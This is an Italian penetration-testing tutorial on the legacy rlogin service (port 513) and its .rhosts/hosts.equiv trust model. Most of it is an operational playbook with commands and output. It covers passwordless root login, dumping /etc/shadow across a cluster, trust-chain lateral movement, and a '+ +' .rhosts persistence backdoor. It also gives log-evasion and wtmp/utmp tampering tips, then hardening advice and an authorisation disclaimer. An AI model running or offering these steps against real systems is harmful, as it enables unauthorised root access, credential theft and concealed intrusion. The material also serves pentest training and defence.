---
title: 'Porta 513 Rlogin: trust .rhosts, accesso root e lateral movement Unix legacy'
slug: porta-513-rlogin
description: 'Scopri cos’è la porta 513 Rlogin, come funzionano .rhosts e hosts.equiv, perché il trust può aprire accessi senza password e come identificare trust chain e lateral movement su sistemi Unix legacy.'
image: /porta-513-rlogin.webp
draft: true
date: 2026-04-06T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - rhosts
  - trust-relationship
---

> **Executive Summary** — La porta 513 rlogin espone il servizio Remote Login BSD, che autentica tramite file trust (`.rhosts`, `hosts.equiv`) invece di password. Una configurazione `+ +` nei file trust consente accesso root da qualsiasi host senza credenziali. Questa guida copre enumerazione trust, accesso non autenticato, trust chain exploitation e pivot verso la rete interna.

TL;DR

* Rlogin si basa su trust relationship: se `.rhosts` o `hosts.equiv` contengono `+ +`, chiunque entra come root senza password
* Anche senza wildcard, puoi sfruttare trust parziali se hai compromesso un host trusted
* Traffico in chiaro — shell interattiva, comandi, credenziali digitate: tutto sniffabile

Porta 513 rlogin è il servizio Remote Login della famiglia r-commands BSD. La porta 513 vulnerabilità fondamentale risiede nel modello di autenticazione: rlogin non chiede password se l'host sorgente è "trusted" nei file `.rhosts` o `/etc/hosts.equiv`. L'enumerazione porta 513 rivela non solo se il servizio è attivo, ma se esistono trust relationship sfruttabili che consentono accesso diretto. In un pentest, rlogin è il vettore che trasforma un singolo host compromesso in un accesso root su tutta la rete legacy — grazie alle trust chain. Nella kill chain si posiziona come vettore di lateral movement: da un host trusted, salti sugli altri senza credenziali.

## 1. Anatomia Tecnica della Porta 513

La porta 513 è registrata IANA come `login` su protocollo TCP. Il daemon `rlogind` gestisce le connessioni, tipicamente via `inetd`/`xinetd`.

Il flusso di autenticazione rlogin:

1. **TCP handshake** sulla porta 513 (il client deve usare una porta sorgente privilegiata, \<1024)
2. **Client → Server**: null byte, username locale, username remoto, tipo terminale
3. **Server**: verifica trust — controlla `hosts.equiv` e `~user/.rhosts` per IP/hostname sorgente e username
4. Se trusted: shell interattiva senza password. Se non trusted: prompt password (fallback)

I file trust funzionano così: `/etc/hosts.equiv` si applica a tutti gli utenti (eccetto root), `~/.rhosts` si applica all'utente specifico (incluso root). Il formato è `hostname [username]`. Il wildcard `+ +` significa "trust tutti gli host per tutti gli utenti".

```
Misconfig: hosts.equiv con "+ +" (trust globale)
Impatto: qualsiasi host può accedere come qualsiasi utente senza password
Come si verifica: rlogin -l root [target] — se ottieni shell senza password, il trust è attivo
```

```
Misconfig: .rhosts di root con wildcard
Impatto: accesso root da qualsiasi host senza autenticazione
Come si verifica: rlogin -l root [target] da qualsiasi IP
```

```
Misconfig: rlogind attivo su interfacce pubbliche senza TCP Wrappers
Impatto: attacker esterni possono tentare trust exploitation
Come si verifica: nmap -sV -p 513 [target] da rete esterna
```

## 2. Enumerazione Base

### Comando 1: Nmap

```bash
nmap -sV -sC -p 513 10.10.10.40
```

**Output atteso:**

```
PORT    STATE SERVICE VERSION
513/tcp open  login   rlogind
| rlogin-brute:
|_  No valid accounts found
```

**Parametri:**

* `-sV`: conferma il servizio come rlogind
* `-sC`: tenta script di default incluso `rlogin-brute` (test base)
* `-p 513`: porta specifica Remote Login

### Comando 2: Rlogin diretto

```bash
rlogin -l root 10.10.10.40
```

**Output atteso (trust attivo):**

```
Last login: Thu Feb 05 10:30:00 from 10.10.10.100
SunOS 5.11
root@prod-srv01:~#
```

**Output atteso (trust non attivo):**

```
Password:
```

**Cosa ci dice questo output:** se ottieni il prompt `root@...#` senza che ti venga chiesta la password, il file trust autorizza il tuo host. Se appare `Password:`, il trust non è configurato per il tuo IP — ma rlogin accetta comunque tentativi password (in chiaro). La differenza tra questi due output è la differenza tra accesso immediato e credential spray.

## 3. Enumerazione Avanzata

### Verifica trust per più utenti

```bash
for user in root admin oracle bin daemon; do
  echo -n "Testing $user: "
  timeout 3 rlogin -l "$user" 10.10.10.40 < /dev/null 2>&1 | head -1
done
```

**Output:**

```
Testing root: Last login: Thu Feb 05 10:30:00
Testing admin: Password:
Testing oracle: Last login: Wed Feb 04 15:00:00
Testing bin: Login incorrect
Testing daemon: Login incorrect
```

**Lettura dell'output:** `root` e `oracle` hanno trust attivo (login diretto senza password). `admin` chiede password (trust non configurato per questo utente). `bin` e `daemon` sono disabilitati per login. Focus su root e oracle come vettori di accesso. Per analizzare i file trust in dettaglio, segui le [tecniche di post-exploitation su Unix](https://hackita.it/articoli/postexploitation).

### Lettura file trust da host compromesso

Se hai già accesso a un host (via rexec, ad esempio — vedi la [guida alla porta 512](https://hackita.it/articoli/rexec)):

```bash
cat /etc/hosts.equiv 2>/dev/null
cat /root/.rhosts 2>/dev/null
find /home -name .rhosts -exec echo "=== {} ===" \; -exec cat {} \; 2>/dev/null
```

**Output:**

```
=== /etc/hosts.equiv ===
prod-srv02
prod-db01
+ oracle

=== /root/.rhosts ===
prod-srv02 root
10.10.10.45 root
```

**Lettura dell'output:** `prod-srv02` è trusted per tutti gli utenti (eccetto root tramite hosts.equiv). `+ oracle` significa che oracle può fare rlogin da qualsiasi host. Root è trusted solo da `prod-srv02` e `10.10.10.45`. Questi dati mappano la trust chain completa.

### Enumerazione trust chain sulla rete

```bash
# Da un host compromesso, cerca tutti gli host con rlogin attivo
nmap -sV -p 513 10.10.10.0/24 --open -Pn | grep "open"
```

**Output:**

```
10.10.10.40 - 513/tcp open login
10.10.10.41 - 513/tcp open login
10.10.10.42 - 513/tcp open login
```

```bash
# Testa trust da questo host verso tutti
for host in 10.10.10.40 10.10.10.41 10.10.10.42; do
  echo -n "$host root: "
  timeout 3 rlogin -l root "$host" < /dev/null 2>&1 | head -1
done
```

**Output:**

```
10.10.10.40 root: Last login: Thu Feb 05
10.10.10.41 root: Password:
10.10.10.42 root: Last login: Wed Feb 04
```

**Lettura dell'output:** da questo host hai trust root verso .40 e .42. Da quei host, ripeti per mappare l'intera trust chain. Ogni hop trusted espande la tua superficie di accesso. Integra questi dati nella [mappa della kill chain](https://hackita.it/articoli/killchain).

## 4. Tecniche Offensive

**Login root senza password (trust exploitation)**

Contesto: hosts.equiv o .rhosts configurati con trust verso il tuo host (o con wildcard).

```bash
rlogin -l root 10.10.10.40
```

**Output (successo):**

```
root@prod-srv01:~# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon)
```

**Output (fallimento):**

```
Password:
Login incorrect
```

**Cosa fai dopo:** shell root senza password. Immediatamente: `cat /etc/shadow`, `cat /root/.rhosts`, `cat /etc/hosts.equiv` per espandere la trust chain verso altri host.

**Trust chain hopping**

Contesto: host A ti trusts, host B trusts host A. Da A, salti su B senza credenziali.

```bash
# Da host A (dove hai già accesso):
rlogin -l root 10.10.10.42
```

**Output (successo):**

```
root@prod-db01:~# hostname
prod-db01
```

**Output (fallimento):**

```
Password:
```

**Cosa fai dopo:** sei su un terzo host (prod-db01) ancora come root, senza aver mai digitato una password. Continua la catena — leggi `.rhosts` per trovare il prossimo hop. Questa tecnica escala esponenzialmente con il numero di host trusted. Per automatizzare, consulta le [tecniche di pivoting](https://hackita.it/articoli/pivoting).

**Abuso di trust parziale (user-to-root)**

Contesto: hai trust come utente non privilegiato. Dall'accesso utente, escali a root.

```bash
# Login come oracle (trusted)
rlogin -l oracle 10.10.10.40
```

```bash
# Da dentro, verifica sudo o SUID
oracle@prod-srv01:~$ sudo -l
oracle@prod-srv01:~$ find / -perm -4000 -type f 2>/dev/null
```

**Output (successo):**

```
User oracle may run the following commands:
    (ALL) NOPASSWD: /usr/bin/sqlplus
```

**Output (fallimento):**

```
oracle is not in the sudoers file. This incident will be reported.
```

**Cosa fai dopo:** se sudo è disponibile su un comando specifico, cerca GTFOBins per escalation. Se ci sono SUID insoliti, analizzali. Anche senza privesc, l'accesso oracle dà accesso al database — estrai dati sensibili con [tecniche di database exploitation](https://hackita.it/articoli/enumeration).

## 5. Scenari Pratici di Pentest

### Scenario 1: Enterprise Unix cluster con trust chain

**Situazione:** cluster di 5 server Solaris in un datacenter. Trust .rhosts configurato tra tutti per automazione. Hai compromesso il jump host.

**Step 1:**

```bash
rlogin -l root 10.10.10.40
cat /etc/hosts.equiv
```

**Output atteso:**

```
prod-srv02
prod-srv03
prod-db01
prod-db02
```

**Step 2:**

```bash
for host in prod-srv02 prod-srv03 prod-db01 prod-db02; do
  echo "=== $host ==="
  rlogin -l root "$host" -e none cat /etc/shadow | head -3
done
```

**Output atteso:**

```
=== prod-srv02 ===
root:$6$...:19400:0:99999:7:::
oracle:$6$...:19350:0:99999:7:::
```

**Se fallisce:**

* Causa probabile: DNS non risolve hostname — rlogin usa hostname, non IP
* Fix: aggiungi i mapping in `/etc/hosts` locale o usa IP: `rlogin -l root 10.10.10.41`

**Tempo stimato:** 5-15 minuti per l'intero cluster

### Scenario 2: Segmented network con rlogin come unico vettore

**Situazione:** rete segmentata, il firewall permette solo porta 513 tra zona DMZ e zona server (legacy). SSH non è configurato sui server interni.

**Step 1:**

```bash
nmap -sV -p 513 10.20.0.0/24 --open -Pn
```

**Output atteso:**

```
10.20.0.10 - 513/tcp open login
10.20.0.11 - 513/tcp open login
```

**Step 2:**

```bash
rlogin -l admin 10.20.0.10
```

**Output atteso:**

```
admin@internal-srv01:~$
```

**Se fallisce:**

* Causa probabile: rlogin richiede porta sorgente \<1024 (privilegiata). Se non sei root sul jump host, non puoi usare porte privilegiate
* Fix: usa `ncat --source-port 1023 10.20.0.10 513` come root, oppure imposta la capability `CAP_NET_BIND_SERVICE`

**Tempo stimato:** 10-20 minuti

### Scenario 3: OT environment con trust legacy

**Situazione:** rete industriale con HMI su HP-UX. Trust .rhosts tra tutti i sistemi di controllo.

**Step 1:**

```bash
rlogin -l root 192.168.1.50
```

**Output atteso:**

```
root@hmi-ctrl01:/# uname -a
HP-UX hmi-ctrl01 B.11.31 U ia64
```

**Step 2:**

```bash
cat /root/.rhosts
```

**Output atteso:**

```
+ +
```

**Se fallisce:**

* Causa probabile: il tuo hostname non è risolvibile dal target HP-UX
* Fix: configura DNS reverse o aggiungi il tuo IP in `/etc/hosts` del target (se hai accesso da altro vettore)

**Tempo stimato:** 5-10 minuti se il trust è wildcard

## 6. Attack Chain Completa

```
Recon (scan 513) → Trust Test → Shell senza password → Shadow Dump → Trust Chain Hop → Full Cluster Access
```

| Fase         | Tool   | Comando chiave                       | Output/Risultato                            |
| ------------ | ------ | ------------------------------------ | ------------------------------------------- |
| Recon        | nmap   | `nmap -sV -p 512,513,514 [subnet]`   | Host con r-commands                         |
| Trust Test   | rlogin | `rlogin -l root [target]`            | Shell o password prompt                     |
| Shell Access | rlogin | Login senza password                 | Root shell interattiva                      |
| Intelligence | cat    | `cat /etc/hosts.equiv /root/.rhosts` | Mappa trust completa                        |
| Chain Hop    | rlogin | `rlogin -l root [next_host]`         | Accesso trust chain                         |
| Persistence  | echo   | `echo "+ +" >> ~/.rhosts`            | Trust permanente (non raccomandato in prod) |

**Timeline stimata:** 10-30 minuti per compromettere un intero cluster con trust attivo.

**Ruolo della porta 513:** è il vettore di lateral movement per eccellenza su reti Unix legacy. Un singolo trust wildcard trasforma un host compromesso in accesso root su tutta la rete.

## 7. Detection & Evasion

### Cosa monitora il Blue Team

* **Log di rlogind**: `/var/log/auth.log`, `/var/adm/wtmpx` (Solaris), `/var/adm/syslog` (AIX)
* **TCP Wrappers**: `/etc/hosts.deny` e `/etc/hosts.allow` — se configurati, loggano connessioni rifiutate
* **IDS**: regole per r-commands (traffico TCP cleartext su porte 512-514)
* **SIEM**: alert su login root da IP non in whitelist

### Tecniche di Evasion

```
Tecnica: Login da host già trusted
Come: assicurati che il tuo host sorgente sia nella lista trust prima di connetterti — se hai modificato .rhosts su un host intermedio
Riduzione rumore: il login appare legittimo nei log (host trusted, utente previsto)
```

```
Tecnica: Usare hostname corretto
Come: rlogin verifica l'hostname reverse DNS. Assicurati che il tuo IP risolva nel nome previsto dal file trust
Riduzione rumore: match perfetto nel log — indistinguibile da traffico legittimo
```

```
Tecnica: Sessioni brevi e mirate
Come: esegui i comandi necessari e disconnetti. Non mantenere shell idle per ore
Riduzione rumore: sessioni brevi generano meno entry in wtmp/utmp
```

### Cleanup Post-Exploitation

* Se hai modificato `.rhosts` per aggiungere trust: rimuovi la riga aggiunta
* Le sessioni rlogin sono loggate in `wtmp`/`utmp` — con accesso root puoi editare con `utmpdump`
* Verifica con `last` che non ci siano sessioni anomale visibili

## 8. Toolchain e Confronto

### Tabella comparativa

| Aspetto            | rlogin (513/TCP)   | rexec (512/TCP) | rsh (514/TCP)      | SSH (22/TCP) |
| ------------------ | ------------------ | --------------- | ------------------ | ------------ |
| Auth model         | Trust (.rhosts)    | Password        | Trust (.rhosts)    | Key/password |
| Shell type         | Interattiva        | Comando singolo | Comando singolo    | Entrambi     |
| Cifratura          | Nessuna            | Nessuna         | Nessuna            | Completa     |
| Porta sorgente     | Deve essere \<1024 | Qualsiasi       | Deve essere \<1024 | Qualsiasi    |
| Rischio principale | Trust wildcard     | Creds in chiaro | Trust wildcard     | Basso        |

## 9. Troubleshooting

| Errore / Sintomo                               | Causa                                                                      | Fix                                                                             |
| ---------------------------------------------- | -------------------------------------------------------------------------- | ------------------------------------------------------------------------------- |
| `Connection refused` su 513                    | rlogind non attivo                                                         | Verifica 512 e 514 — potrebbero essere attivi senza rlogin                      |
| `rcmd: socket: Permission denied`              | Client non usa porta privilegiata (\<1024)                                 | Esegui rlogin come root oppure usa `ncat --source-port 1023`                    |
| `Password:` anche se trust dovrebbe funzionare | Hostname mismatch — il server non risolve il tuo IP nell'hostname previsto | Verifica con `nslookup [tuo_IP]` sul target e assicurati che matchi hosts.equiv |
| Shell si chiude immediatamente                 | Account disabilitato (`/sbin/nologin` o `/bin/false` come shell)           | Prova un altro utente: `rlogin -l oracle [target]`                              |
| `Connection timed out`                         | Firewall in mezzo o TCP Wrappers che droppano                              | Verifica con `nmap -sV -p 513 [target]` lo stato della porta                    |

## 10. FAQ

**D: Cos'è rlogin e come funziona il trust sulla porta 513?**

R: Rlogin è un servizio di login remoto Unix sulla porta 513 TCP. Autentica tramite file trust: se l'host sorgente e l'utente sono listati in `/etc/hosts.equiv` o `~/.rhosts` del target, l'accesso è concesso senza password.

**D: Cosa significa "+ +" nel file .rhosts?**

R: Il doppio wildcard `+ +` in `.rhosts` significa "qualsiasi host, qualsiasi utente" — accesso totale senza autenticazione. Se lo trovi nel `.rhosts` di root, hai accesso root da qualsiasi IP della rete.

**D: Rlogin richiede porta sorgente privilegiata?**

R: Sì. Il client rlogin deve usare una porta sorgente inferiore a 1024 (porta privilegiata) per essere accettato dal server. Questo significa che devi essere root sulla macchina attaccante per usare il client standard.

**D: Come si enumera la trust chain di una rete con rlogin?**

R: Da ogni host compromesso, leggi `/etc/hosts.equiv` e `~/.rhosts` di tutti gli utenti. Mappa le relazioni di trust. Poi testa rlogin da ogni host verso tutti gli altri per verificare i trust bidirezionali. Ripeti ricorsivamente.

**D: Come disabilitare rlogin su sistemi legacy?**

R: Commenta la riga `login` in `/etc/inetd.conf` e riavvia il daemon (`kill -HUP` su inetd). In alternativa, blocca la porta 513 con TCP Wrappers: `echo "login: ALL" >> /etc/hosts.deny`.

## 11. Cheat Sheet Finale

| Azione                | Comando                                      | Note                            |
| --------------------- | -------------------------------------------- | ------------------------------- |
| Scan porte r-commands | `nmap -sV -p 512,513,514 [subnet] --open`    | Tutte e tre insieme             |
| Test trust root       | `rlogin -l root [target]`                    | Se shell diretta = trust attivo |
| Test multi-utente     | Loop con timeout (vedi sezione 3)            | Testa root, admin, oracle, ecc. |
| Leggi hosts.equiv     | `cat /etc/hosts.equiv`                       | Trust globale (non-root)        |
| Leggi .rhosts root    | `cat /root/.rhosts`                          | Trust specifico root            |
| Trova tutti .rhosts   | `find / -name .rhosts 2>/dev/null`           | Mappa trust completa            |
| Trust chain hop       | `rlogin -l root [next_host]` da host trusted | Lateral movement                |
| Sniff sessioni        | `sudo tcpdump -i eth0 tcp port 513 -A`       | Tutto in chiaro                 |

### Perché Porta 513 è rilevante nel 2026

Rlogin sopravvive in ambienti con cluster Unix legacy — Solaris, AIX, HP-UX — dove le trust relationship sono il meccanismo standard per l'automazione inter-host. La migrazione a SSH è spesso incompleta. In ambienti OT/ICS, i sistemi HMI e SCADA su Unix usano ancora r-commands per manutenzione. Verifica sempre le porte 512-514 durante un engagement interno.

### Hardening e Mitigazione

* Disabilita rlogind: rimuovi la riga `login` da `/etc/inetd.conf`
* Elimina tutti i file `.rhosts` e `hosts.equiv`: `find / -name .rhosts -delete`
* Migra a SSH con autenticazione a chiave pubblica
* Se rlogin è temporaneamente necessario: restrizioni TCP Wrappers + hosts.equiv con solo hostname specifici (mai `+`)

### OPSEC per il Red Team

Un login rlogin viene registrato in `wtmp`/`utmp` e visibile con `last`. Il rumore è basso se il trust è attivo (login riuscito al primo tentativo = uso normale). Il rischio sale se devi fallire più tentativi per trovare trust. Per massima invisibilità: leggi `.rhosts` da un host già compromesso prima di tentare rlogin, così sai in anticipo se il trust funzionerà.

***

Tutti i comandi e le tecniche sono destinati esclusivamente ad ambienti autorizzati: penetration test con contratto, lab, CTF. Riferimento: RFC 1282 (BSD Rlogin), manpage rlogind(8).

> Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).
